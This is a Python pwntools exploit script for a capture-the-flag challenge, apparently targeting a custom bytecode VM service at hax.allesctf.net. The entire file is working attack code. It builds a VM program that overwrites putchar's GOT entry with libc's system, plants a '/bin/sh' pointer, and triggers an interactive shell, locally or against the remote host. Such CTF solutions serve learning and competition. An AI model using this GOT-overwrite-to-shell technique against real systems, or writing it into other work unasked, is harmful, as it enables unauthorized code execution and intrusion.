#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "hax.allesctf.net"
PORT = 3301

# Convert opcode number to binary number
def op(opcode):
	result = "";
	result += opcode*"1"
	result += "0"
	return result

# Convert binary data to program
def convertprogram(code):
	result = "";

	i = 0
	for i in range(0, len(code), 8):
		result += p8(int(code[i:i+8], 2))
	
	return result

def incidx(count = 1):
	return op(1) * count

def decidx(count = 1):
	return op(2) * count

def incval(count = 1):
	return op(3) * count

def decval(count = 1):
	return op(4) * count

def storeeip(idx):
	return op(8)

def movacc():
	return op(6)

def setarrayidx():
	return op(9)

def jnz():
	return op(5)

def putchar():
	return op(7)

# ctf quick&dirty ;)
def get_factors(diff):
	mult = 0x500
	factor = diff / mult
	remaining = 0

	while True:
		mult_diff = diff - (mult * factor)

		if (mult_diff > factor):
			mult += 1
		else:
			break

	remaining = diff - (mult * factor)

	return mult, factor, remaining

def write_value(address, org_address, dest_address, rbp_off=0x68):
	if org_address > dest_address:
		mult, factor, remaining = get_factors(org_address - dest_address)
		increase = 0
	else:
		mult, factor, remaining = get_factors(dest_address - org_address)
		increase = 1

	return change_val(mult, factor, remaining, address, rbp_off, increase)


def change_val(mult, factor, remaining, address, rbp_off=0x68, increase=1):
	payload = ""

	# move to "offset" index for current chain	
	payload += decval((0x405008 - 0x404000 - rbp_off) / 4)
	payload += movacc()
	payload += setarrayidx()
	payload += incidx()

	# write multipllicator
	payload += incval(mult)
	payload += decidx()

	# store label
	payload += storeeip(0)
	payload += setarrayidx()		# on ip cell
	payload += movacc()				# store eip in acc

	# move to destination address
	payload += decidx( ((0x404000+rbp_off) - address) / 4)

	if increase == 1:
		payload += incval(factor)	# increase value by x
	else:
		payload += decval(factor)	# decrease value by x

	# go back to multiplicator and decrease it
	payload += incidx( ((0x404000+rbp_off) - address + 4) / 4)
	payload += decval()

	# repeat until multiplier == 0
	payload += jnz()

	# add remaining value
	payload += decidx()
	payload += decidx(((0x404000+rbp_off) - address) / 4)

	if increase == 1:
		payload += incval(remaining)
	else:
		payload += decval(remaining)

	# go back to start point
	payload += incidx( ((0x404000 + rbp_off) - address) / 4)
	payload += incidx( ((0x1000 - rbp_off + 8)) / 4)

	return payload

def exploit(r):
	if not LOCAL:
		r.recvuntil("stdin..\n\n")
	
	payload = ""
		
	# call putchar to resolve it
	payload += putchar()

	# overwrite putchar with system
	payload += write_value(0x404018, libc.symbols["putchar"], libc.symbols["system"], 0x68)
	
	# move to /bin/sh and call putchar to trigger system
	payload += incval(0x3e8)
	payload += movacc()
	payload += setarrayidx()

	payload += incidx()				# cell 1
	payload += incval(0x20)
	payload += decidx()				# cell 0

	payload += storeeip(1)			# stored ip in 0
	payload += setarrayidx()
	payload += movacc()

	payload += incidx(2)			# cell 2
	payload += incval(25)	
	payload += decidx(1)			# cell 1
	payload += decval()				# decrease counter
	payload += jnz()

	payload += incidx()				# cell 2
	payload += movacc()
	payload += setarrayidx()		# move cell to /bin/sh ptr

	payload += putchar()
	payload += putchar()

	data = convertprogram(payload)

	# Append pointer to /bin/sh and /bin/sh string to program code
	data = data.ljust(2408, "A")
	data += p64(0x405c90)			# pointer to /bin/sh
	data += "/bin/sh"			

	program = p32(0x30)
	program += p32((len(data))*8)
	program += data
	
	r.sendline(program)
	
	r.interactive()
	
	return

if __name__ == "__main__":
	e = ELF("./vm")
	libc = ELF("./libc.so.6")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		r = process("./vm", env={"LD_PRELOAD":"./buffer_read.so"})
		print util.proc.pidof(r)
		pause()
		exploit(r)

